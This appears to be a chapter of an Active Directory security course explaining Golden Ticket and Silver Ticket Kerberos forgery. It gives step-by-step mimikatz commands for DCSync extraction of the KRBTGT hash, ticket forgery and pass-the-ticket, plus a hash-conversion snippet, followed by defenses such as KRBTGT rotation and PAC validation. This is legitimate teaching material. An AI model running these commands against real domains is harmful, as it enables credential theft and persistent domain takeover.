# 06 — Attacks: Golden Ticket & Silver Ticket

These are two of the most powerful (and dangerous) AD attacks — both let an attacker **forge** Kerberos tickets instead of legitimately requesting them.

---

## Golden Ticket

**Access required:** you must already have full domain compromise (i.e. Domain Admin level access, at least briefly) to steal the one secret this attack depends on.

### The idea, simply

Remember the **KRBTGT** account from `00-what-is-active-directory.md`-adjacent concepts? It's a special, hidden built-in account that the Domain Controller uses to sign/encrypt **every single Kerberos ticket** in the whole domain. It's basically the "master signature stamp" for the entire school's ID card system.

If an attacker steals the KRBTGT account's password hash, they can now **forge their own tickets from scratch** — tickets that look 100% legitimate to every computer in the domain, because they're signed with the real master stamp. This is called a **Golden Ticket**, and it lets the attacker impersonate *any* user (including accounts that don't even exist!) and access *any* resource, for as long as they want (tickets can even be forged to "never expire").

### Step-by-step

**1. Gather what you need:**
```powershell
# Domain name — you already know this
# Domain SID (unique domain ID number)
whoami /user
```

**2. Get the KRBTGT account's NTLM hash** (requires Domain Admin rights already):
```
mimikatz # lsadump::dcsync /domain:<domain name> /user:krbtgt
```
`dcsync` abuses the domain replication feature — it tricks the Domain Controller into "replicating" (syncing) KRBTGT's password hash to the attacker, as if the attacker's machine were another legitimate Domain Controller.

**3. Forge the Golden Ticket:**
```
mimikatz # kerberos::golden /domain:<domain name> /sid:<sid from whoami /user> /rc4:<krbtgt ntlm hash> /id:<user id, e.g. 500> /user:<any username>
```
This saves a forged ticket file with a `.kirbi` extension.

**4. Load the forged ticket into your current session (Pass the Ticket):**
```
mimikatz # kerberos::ptt <filename>.kirbi
```
A new command prompt opens with elevated privileges — as if you had legitimately logged in as a Domain Admin (or any user you chose), anywhere in the domain.

### Why this is so devastating
Once an attacker has the KRBTGT hash, **they own the domain, permanently**, until that hash is rotated. Just kicking the attacker off one machine does nothing — they can forge a fresh, valid ticket any time.

### Defenses
- **Change the KRBTGT password regularly** (and do it *twice* in a row when responding to a real compromise — Microsoft's official guidance — because AD keeps the last 2 passwords valid).
- Minimize which accounts can even access/replicate the KRBTGT hash.
- Set up alerts for:
  - Tickets with unusually **long lifetimes**.
  - Unexpected/abnormal **domain replication activity** (a sign of DCSync abuse).
  - Sudden **changes to privileged group membership**.

---

## Silver Ticket

**Access required:** the NTLM hash of a single **service account** (obtainable via Kerberoasting, for example) — much lower bar than a Golden Ticket.

### The idea, simply

A Silver Ticket is a "smaller, sneakier cousin" of the Golden Ticket. Instead of forging a master ticket that works everywhere (which needs the KRBTGT hash), the attacker forges a ticket for **one specific service only**, using that service account's own password hash.

Because the forged ticket is only used against that one service directly, it **never has to touch the Domain Controller at all** — making it even quieter and harder to detect than a Golden Ticket.

### Step-by-step

**1. Get the service account's password** (e.g. via Kerberoasting, see `03-attack-kerberoasting.md`).

**2. Convert that password into its NTLM hash:**
```powershell
Import-Module DSInternals
$hash = ConvertTo-SecureString '<service account password>' -AsPlainText -Force
ConvertTo-NTHash $hash
```

**3. Forge the Silver Ticket and use it immediately:**
```
mimikatz # kerberos::golden /sid:<sid> /domain:<domain name> /ptt /target:<spn from kerberoasting> /service:<service name> /rc4:<ntlm hash from step 2> /user:<username> /id:<id for user>
```
This grants privileged access directly to that one target service — bypassing the Domain Controller entirely.

### Defenses
- Adopt strong password hygiene for **every** service account (see `03-attack-kerberoasting.md`).
- Enable **PAC validation** (Privilege Attribute Certificate) — this makes the target service double-check ticket legitimacy with the Domain Controller, closing part of the "never touches the DC" loophole.
- Remove unnecessary admin rights on member workstations/servers; use controlled privilege elevation instead of standing admin access.
- Apply the same Kerberoasting mitigations, since that's usually how the attacker got the service hash in the first place.
- Keep administrative access to servers/workstations limited to the **least required**.
